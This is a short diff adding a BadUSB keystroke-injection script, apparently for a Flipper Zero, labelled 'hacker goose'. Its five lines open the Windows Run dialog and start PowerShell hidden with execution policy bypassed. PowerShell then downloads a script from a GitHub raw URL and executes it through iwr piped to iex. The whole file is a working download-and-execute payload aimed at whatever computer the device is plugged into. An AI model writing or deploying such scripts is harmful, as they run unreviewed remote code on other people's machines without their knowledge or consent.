@@ -1,0 +1,5 @@
+REM hacker goose
+GUI r
+DELAY 500
+ALTSTRING powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr -useb 'https://raw.githubusercontent.com/6uard1an/Cool-FLipper-Zero-BadUSB-s/main/HackerGoose.ps1' | iex"
+ENTER
